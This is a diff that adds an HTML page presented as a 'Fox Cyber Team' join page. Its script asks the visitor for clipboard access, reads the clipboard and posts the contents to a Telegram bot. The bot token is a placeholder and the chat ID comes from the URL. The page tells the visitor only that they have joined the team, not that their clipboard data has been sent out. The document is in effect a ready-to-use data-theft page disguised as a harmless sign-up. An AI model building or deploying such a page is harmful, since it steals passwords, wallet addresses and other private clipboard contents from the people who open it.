@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fox Cyber Team</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
+        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); display: inline-block; }
+        button { padding: 10px 20px; font-size: 16px; margin-top: 20px; cursor: pointer; }
+        .hidden { display: none; }
+        #success { color: green; font-size: 20px; }
+        #error { color: red; font-size: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>🦊 Welcome to Fox Cyber Team</h2>
+        <p>To proceed, please allow clipboard access.</p>
+        <button onclick="requestClipboard()">Allow Clipboard Access</button>
+    </div>
+
+    <p id="success" class="hidden">✅ You have successfully joined 🦊 Fox Cyber Team!</p>
+    <p id="error" class="hidden">❌ Error: Permission Denied!</p>
+
+    <script>
+        async function requestClipboard() {
+            try {
+                // Clipboard permission request
+                await navigator.permissions.query({ name: "clipboard-read" });
+                let text = await navigator.clipboard.readText();
+
+                // Process clipboard data
+                processClipboard(text);
+            } catch (err) {
+                document.getElementById('error').classList.remove('hidden');
+            }
+        }
+
+        function processClipboard(clipboardText) {
+            // Extract Telegram Chat ID from URL
+            let urlParams = new URLSearchParams(window.location.search);
+            let chatId = urlParams.get('id'); // Example: gdkd.com?id=chatid
+
+            if (chatId) {
+                sendToTelegram(clipboardText, chatId);
+            } else {
+                document.getElementById('error').classList.remove('hidden');
+            }
+        }
+
+        function sendToTelegram(clipboardText, chatId) {
+            let botToken = "YOUR_BOT_TOKEN_HERE"; // Replace with your bot token
+            let apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            let message = `Clipboard Data: ${clipboardText}`;
+            
+            fetch(apiUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.querySelector('.container').innerHTML = '<h2>✅ You have successfully joined 🦊 Fox Cyber Team!</h2>';
+                } else {
+                    document.getElementById('error').classList.remove('hidden');
+                }
+            })
+            .catch(error => {
+                document.getElementById('error').classList.remove('hidden');
+            });
+        }
+    </script>
+
+</body>
+</html>
